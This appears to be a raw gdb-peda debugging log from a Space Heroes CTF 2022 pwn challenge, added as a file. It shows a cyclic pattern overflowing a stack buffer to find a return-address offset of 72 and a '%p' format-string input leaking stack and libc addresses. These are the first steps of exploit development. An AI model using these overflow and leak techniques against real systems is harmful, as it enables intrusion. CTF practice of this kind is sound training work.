@@ -1,0 +1,92 @@
+gdb-peda$ vmmap
+Start              End                Perm	Name
+0x0000555555554000 0x0000555555555000 r--p	/home/mito/CTF/Space_Heroes_CTF_2022/Pwn_Rocket/pwn-rocket
+0x0000555555555000 0x0000555555556000 r-xp	/home/mito/CTF/Space_Heroes_CTF_2022/Pwn_Rocket/pwn-rocket
+0x0000555555556000 0x0000555555558000 r--p	/home/mito/CTF/Space_Heroes_CTF_2022/Pwn_Rocket/pwn-rocket
+0x0000555555558000 0x0000555555559000 r--p	/home/mito/CTF/Space_Heroes_CTF_2022/Pwn_Rocket/pwn-rocket
+0x0000555555559000 0x000055555555a000 rw-p	/home/mito/CTF/Space_Heroes_CTF_2022/Pwn_Rocket/pwn-rocket
+0x000055555555a000 0x000055555557b000 rw-p	[heap]
+0x00007ffff77c2000 0x00007ffff79a9000 r-xp	/lib/x86_64-linux-gnu/libc-2.27.so
+0x00007ffff79a9000 0x00007ffff7ba9000 ---p	/lib/x86_64-linux-gnu/libc-2.27.so
+0x00007ffff7ba9000 0x00007ffff7bad000 r--p	/lib/x86_64-linux-gnu/libc-2.27.so
+0x00007ffff7bad000 0x00007ffff7baf000 rw-p	/lib/x86_64-linux-gnu/libc-2.27.so
+0x00007ffff7baf000 0x00007ffff7bb3000 rw-p	mapped
+0x00007ffff7bb3000 0x00007ffff7bd1000 r-xp	/lib/x86_64-linux-gnu/libseccomp.so.2.5.1
+0x00007ffff7bd1000 0x00007ffff7dd1000 ---p	/lib/x86_64-linux-gnu/libseccomp.so.2.5.1
+0x00007ffff7dd1000 0x00007ffff7dd2000 r--p	/lib/x86_64-linux-gnu/libseccomp.so.2.5.1
+0x00007ffff7dd2000 0x00007ffff7dd3000 rw-p	/lib/x86_64-linux-gnu/libseccomp.so.2.5.1
+0x00007ffff7dd3000 0x00007ffff7dfc000 r-xp	/lib/x86_64-linux-gnu/ld-2.27.so
+0x00007ffff7fd1000 0x00007ffff7fd6000 rw-p	mapped
+0x00007ffff7ff7000 0x00007ffff7ffa000 r--p	[vvar]
+0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp	[vdso]
+0x00007ffff7ffc000 0x00007ffff7ffd000 r--p	/lib/x86_64-linux-gnu/ld-2.27.so
+0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p	/lib/x86_64-linux-gnu/ld-2.27.so
+0x00007ffff7ffe000 0x00007ffff7fff000 rw-p	mapped
+0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
+0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
+
+
+gdb-peda$ run
+Starting program: /home/mito/CTF/Space_Heroes_CTF_2022/Pwn_Rocket/pwn-rocket 
+Please authenticate >>>
+111111111
+<<< Welcome: 111111111
+Welcome To Mission Control. Tell me to do something >>>
+AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMA
+<<< Invalid Command.
+
+Program received signal SIGSEGV, Segmentation fault.
+
+[----------------------------------registers-----------------------------------]
+RAX: 0x15 
+RBX: 0x0 
+RCX: 0x7ffff78d2104 (<__GI___libc_write+20>:	cmp    rax,0xfffffffffffff000)
+RDX: 0x7ffff7baf8c0 --> 0x0 
+RSI: 0x7ffff7bae7e3 --> 0xbaf8c0000000000a 
+RDI: 0x1 
+RBP: 0x4141334141644141 ('AAdAA3AA')
+RSP: 0x7fffffffddb8 ("IAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A"...)
+RIP: 0x555555555605 (<vuln+212>:	ret)
+R8 : 0x14 
+R9 : 0x7ffff7fd1740 (0x00007ffff7fd1740)
+R10: 0x4 
+R11: 0x246 
+R12: 0x5555555550e0 (<_start>:	xor    ebp,ebp)
+R13: 0x7fffffffdea0 ("A%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAs"...)
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x5555555555fe <vuln+205>:	call   0x555555555060 <puts@plt>
+   0x555555555603 <vuln+210>:	nop
+   0x555555555604 <vuln+211>:	leave  
+=> 0x555555555605 <vuln+212>:	ret    
+   0x555555555606 <main>:	push   rbp
+   0x555555555607 <main+1>:	mov    rbp,rsp
+   0x55555555560a <main+4>:	mov    eax,0x0
+   0x55555555560f <main+9>:	call   0x5555555554ec <secure>
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffddb8 ("IAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A"...)
+0008| 0x7fffffffddc0 ("AJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4"...)
+0016| 0x7fffffffddc8 ("AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%"...)
+0024| 0x7fffffffddd0 ("6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA"...)
+0032| 0x7fffffffddd8 ("A7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%h"...)
+0040| 0x7fffffffdde0 ("AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%"...)
+0048| 0x7fffffffdde8 ("jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA"...)
+0056| 0x7fffffffddf0 ("AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%O"...)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x0000555555555605 in vuln ()
+gdb-peda$ patto IAAe
+IAAe found at offset: 72
+
+gdb-peda$ run
+Starting program: /home/mito/CTF/Space_Heroes_CTF_2022/Pwn_Rocket/pwn-rocket 
+Please authenticate >>>
+AAAAAAAA,%p,%p,%p,%p,%p,%p,%p
+<<< Welcome: AAAAAAAA,0x7fffffffb6d0,0x7ffff7baf8c0,(nil),0xd,0x7ffff7fd1740,0x5555555550e0,0x7fffffffdea0
+Welcome To Mission Control. Tell me to do something >>>
+^C
+Program received signal SIGINT, Interrupt.
+
